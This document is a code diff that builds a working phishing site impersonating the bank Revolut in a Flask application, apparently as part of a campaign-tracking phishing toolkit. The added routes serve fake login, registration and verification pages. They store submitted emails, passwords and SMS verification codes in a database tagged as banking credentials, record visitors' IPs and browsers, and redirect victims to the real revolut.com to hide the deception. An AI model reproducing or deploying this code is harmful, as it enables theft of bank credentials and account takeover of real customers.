@@ -1,68 +1,349 @@
 ﻿# ==========================================
-# routes/fake_revolut.py - STUB
+# routes/fake_revolut.py - Complete Implementation
 # ==========================================
 
 """
-Fake Revolut routes - Site-ul fake
-TODO: Implementare completă
+Fake Revolut routes - Complete fake site implementation with tracking and credential capture
 """
 
-from flask import Blueprint, request, redirect
+from flask import Blueprint, request, redirect, render_template, session, jsonify
+from datetime import datetime
+import secrets
+import random
+
+# Import models for credential logging
+from models.credential import Credential
+from models.tracking import Tracking
+from utils.database import db
 
 bp = Blueprint('fake_revolut', __name__)
 
-@bp.route('/login')
-def login_page():
-    """Pagina de login fake - STUB"""
+# === UTILITY FUNCTIONS ===
+
+def get_campaign_target_info():
+    """Extract campaign and target IDs from request"""
     campaign_id = request.args.get('c', 'unknown')
     target_id = request.args.get('t', 'unknown')
+    return campaign_id, target_id
+
+def get_client_info():
+    """Extract client information for tracking"""
+    return {
+        'ip_address': request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR')),
+        'user_agent': request.headers.get('User-Agent'),
+        'referrer': request.headers.get('Referer'),
+        'session_id': session.get('revolut_session_id', secrets.token_urlsafe(32))
+    }
+
+def track_page_visit(page_name):
+    """Track page visit for analytics"""
+    campaign_id, target_id = get_campaign_target_info()
+    client_info = get_client_info()
     
-    print(f"STUB: Fake login page accessed - Campaign: {campaign_id}, Target: {target_id}")
+    try:
+        tracking_event = Tracking.create_event(
+            campaign_id=campaign_id,
+            event_type='page_visited',
+            target_id=target_id if target_id != 'unknown' else None,
+            event_data={'page': page_name},
+            **client_info
+        )
+        print(f"Tracked page visit: {page_name} - Campaign: {campaign_id}, Target: {target_id}")
+    except Exception as e:
+        print(f"Error tracking page visit: {e}")
+
+def capture_credentials_to_db(form_data, page_url, form_type='unknown'):
+    """Capture credentials to database"""
+    campaign_id, target_id = get_campaign_target_info()
+    client_info = get_client_info()
     
-    return f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Revolut - Sign In</title>
-        <style>
-            body {{ font-family: Arial, sans-serif; max-width: 400px; margin: 100px auto; padding: 20px; }}
-            .logo {{ text-align: center; color: #0066cc; font-size: 24px; margin-bottom: 30px; }}
-            .form-group {{ margin-bottom: 15px; }}
-            input {{ width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }}
-            button {{ width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 5px; }}
-        </style>
-    </head>
-    <body>
-        <div class="logo">🏦 Revolut</div>
-        <h2>Sign in to your account</h2>
+    try:
+        # Extract username/email and password
+        username = form_data.get('email') or form_data.get('username', '')
+        password = form_data.get('password', '')
         
-        <form method="POST">
-            <div class="form-group">
-                <input type="email" name="username" placeholder="Email" required>
-            </div>
-            <div class="form-group">
-                <input type="password" name="password" placeholder="Password" required>
-            </div>
-            <button type="submit">Sign In</button>
-        </form>
-        
-        <p><small>STUB: This is a fake login page for testing</small></p>
-    </body>
-    </html>
-    """
+        if username and password:
+            credential = Credential(
+                campaign_id=campaign_id,
+                target_id=target_id if target_id != 'unknown' else None,
+                username=username,
+                password=password,
+                page_url=page_url,
+                form_data=str(form_data),
+                credential_type='banking',
+                **client_info
+            )
+            
+            db.session.add(credential)
+            db.session.commit()
+            
+            print(f"Captured credentials: {username} / {'*' * len(password)} - Campaign: {campaign_id}")
+            return True
+    except Exception as e:
+        print(f"Error capturing credentials: {e}")
+        db.session.rollback()
+    
+    return False
+
+def check_interaction_threshold():
+    """Check if user has reached interaction threshold for redirect"""
+    interaction_count = session.get('revolut_interactions', 0)
+    max_interactions = 5  # Redirect after 5 interactions
+    
+    if interaction_count >= max_interactions:
+        return True
+    return False
+
+def increment_interactions():
+    """Increment interaction counter"""
+    session['revolut_interactions'] = session.get('revolut_interactions', 0) + 1
+    session['revolut_session_id'] = session.get('revolut_session_id', secrets.token_urlsafe(32))
+
+# === MAIN ROUTES ===
+
+@bp.route('/')
+def home():
+    """Home page of fake Revolut site"""
+    track_page_visit('home')
+    increment_interactions()
+    
+    return render_template('revolut/home.html')
+
+@bp.route('/login')
+def login_page():
+    """Login page"""
+    track_page_visit('login')
+    increment_interactions()
+    
+    # Check if should redirect to real site
+    if check_interaction_threshold():
+        session.clear()
+        return redirect('https://revolut.com')
+    
+    return render_template('revolut/login.html')
 
 @bp.route('/login', methods=['POST'])
 def login_submit():
-    """Procesarea formularului fake - STUB"""
-    username = request.form.get('username')
-    password = request.form.get('password')
+    """Process login form submission"""
+    form_data = dict(request.form)
+    page_url = request.url
+    client_info = get_client_info()
     
-    print(f"STUB: Credentials captured - {username} / {password}")
+    # Track form submission
+    campaign_id, target_id = get_campaign_target_info()
+    try:
+        Tracking.create_event(
+            campaign_id=campaign_id,
+            event_type='form_submitted',
+            target_id=target_id if target_id != 'unknown' else None,
+            event_data={'form_type': 'login', 'page': 'login'},
+            **client_info
+        )
+    except Exception as e:
+        print(f"Error tracking form submission: {e}")
     
-    # Redirect to real Revolut
-    return redirect('https://revolut.com')
+    # Capture credentials
+    capture_credentials_to_db(form_data, page_url, 'login')
+    
+    # Simulate processing time and redirect
+    increment_interactions()
+    session['user_logged_in'] = True
+    session['user_name'] = form_data.get('email', 'User').split('@')[0].title()
+    session['user_email'] = form_data.get('email', 'user@example.com')
+    
+    return redirect('/revolut/dashboard')
 
 @bp.route('/register')
 def register_page():
-    """Pagina de înregistrare fake - STUB"""
-    return "<h1>🏦 Revolut Register</h1><p>Register page coming soon...</p>"
+    """Registration page"""
+    track_page_visit('register')
+    increment_interactions()
+    
+    # Check if should redirect to real site
+    if check_interaction_threshold():
+        session.clear()
+        return redirect('https://revolut.com')
+    
+    return render_template('revolut/register.html')
+
+@bp.route('/register', methods=['POST'])
+def register_submit():
+    """Process registration form submission"""
+    form_data = dict(request.form)
+    page_url = request.url
+    client_info = get_client_info()
+    
+    # Track form submission
+    campaign_id, target_id = get_campaign_target_info()
+    try:
+        Tracking.create_event(
+            campaign_id=campaign_id,
+            event_type='form_submitted',
+            target_id=target_id if target_id != 'unknown' else None,
+            event_data={'form_type': 'register', 'page': 'register'},
+            **client_info
+        )
+    except Exception as e:
+        print(f"Error tracking form submission: {e}")
+    
+    # Capture credentials
+    capture_credentials_to_db(form_data, page_url, 'register')
+    
+    # Simulate processing and redirect to verification
+    increment_interactions()
+    session['user_registered'] = True
+    session['user_name'] = f"{form_data.get('first_name', 'User')} {form_data.get('last_name', '')}"
+    session['user_email'] = form_data.get('email', 'user@example.com')
+    
+    return redirect('/revolut/verify')
+
+@bp.route('/verify')
+def verify_page():
+    """Phone verification page"""
+    track_page_visit('verify')
+    increment_interactions()
+    
+    # Check if should redirect to real site
+    if check_interaction_threshold():
+        session.clear()
+        return redirect('https://revolut.com')
+    
+    return render_template('revolut/verify.html')
+
+@bp.route('/verify', methods=['POST'])
+def verify_submit():
+    """Process verification code submission"""
+    form_data = dict(request.form)
+    client_info = get_client_info()
+    
+    # Track verification attempt
+    campaign_id, target_id = get_campaign_target_info()
+    try:
+        Tracking.create_event(
+            campaign_id=campaign_id,
+            event_type='form_submitted',
+            target_id=target_id if target_id != 'unknown' else None,
+            event_data={'form_type': 'verify', 'code': form_data.get('verification_code', '')},
+            **client_info
+        )
+    except Exception as e:
+        print(f"Error tracking verification: {e}")
+    
+    # Simulate successful verification
+    increment_interactions()
+    session['user_verified'] = True
+    session['user_logged_in'] = True
+    
+    return redirect('/revolut/dashboard')
+
+@bp.route('/dashboard')
+def dashboard():
+    """User dashboard"""
+    track_page_visit('dashboard')
+    increment_interactions()
+    
+    # Check if should redirect to real site
+    if check_interaction_threshold():
+        session.clear()
+        return redirect('https://revolut.com')
+    
+    user_name = session.get('user_name', 'John Doe')
+    return render_template('revolut/dashboard.html', 
+                         user_logged_in=True, 
+                         user_name=user_name)
+
+@bp.route('/profile')
+def profile():
+    """User profile page"""
+    track_page_visit('profile')
+    increment_interactions()
+    
+    # Check if should redirect to real site
+    if check_interaction_threshold():
+        session.clear()
+        return redirect('https://revolut.com')
+    
+    user_name = session.get('user_name', 'John Doe')
+    user_email = session.get('user_email', 'john.doe@example.com')
+    
+    return render_template('revolut/profile.html', 
+                         user_logged_in=True, 
+                         user_name=user_name,
+                         user_email=user_email)
+
+# === API ENDPOINTS FOR INTERACTION TRACKING ===
+
+@bp.route('/api/track', methods=['POST'])
+def track_interaction():
+    """API endpoint for tracking interactions via JavaScript"""
+    try:
+        data = request.get_json()
+        campaign_id, target_id = get_campaign_target_info()
+        client_info = get_client_info()
+        
+        Tracking.create_event(
+            campaign_id=campaign_id,
+            event_type='interaction',
+            target_id=target_id if target_id != 'unknown' else None,
+            event_data=data,
+            **client_info
+        )
+        
+        # Increment interaction counter
+        increment_interactions()
+        
+        return jsonify({'status': 'success', 'interactions': session.get('revolut_interactions', 0)})
+    except Exception as e:
+        print(f"Error tracking interaction: {e}")
+        return jsonify({'status': 'error'}), 500
+
+# === REDIRECT LOGIC ===
+
+@bp.route('/crash')
+def simulate_crash():
+    """Simulate a "crash" that redirects to real Revolut"""
+    try:
+        # Track the redirect event
+        campaign_id, target_id = get_campaign_target_info()
+        client_info = get_client_info()
+        
+        Tracking.create_event(
+            campaign_id=campaign_id,
+            event_type='redirect_followed',
+            target_id=target_id if target_id != 'unknown' else None,
+            event_data={'reason': 'simulated_crash', 'interactions': session.get('revolut_interactions', 0)},
+            **client_info
+        )
+    except Exception as e:
+        print(f"Error tracking redirect: {e}")
+    
+    # Clear session and redirect
+    session.clear()
+    return redirect('https://revolut.com')
+
+# === ERROR HANDLING ===
+
+@bp.errorhandler(404)
+def revolut_not_found(error):
+    """Custom 404 handler for Revolut routes"""
+    # Redirect to real Revolut for unknown pages
+    return redirect('https://revolut.com')
+
+# === DEBUG ROUTE (Remove in production) ===
+
+@bp.route('/debug')
+def debug_info():
+    """Debug information about current session"""
+    if not request.args.get('debug') == 'true':
+        return redirect('/revolut/')
+    
+    debug_data = {
+        'session': dict(session),
+        'interactions': session.get('revolut_interactions', 0),
+        'campaign_id': request.args.get('c', 'unknown'),
+        'target_id': request.args.get('t', 'unknown'),
+        'client_info': get_client_info(),
+        'should_redirect': check_interaction_threshold()
+    }
+    
+    return f"<pre>{str(debug_data)}</pre>"
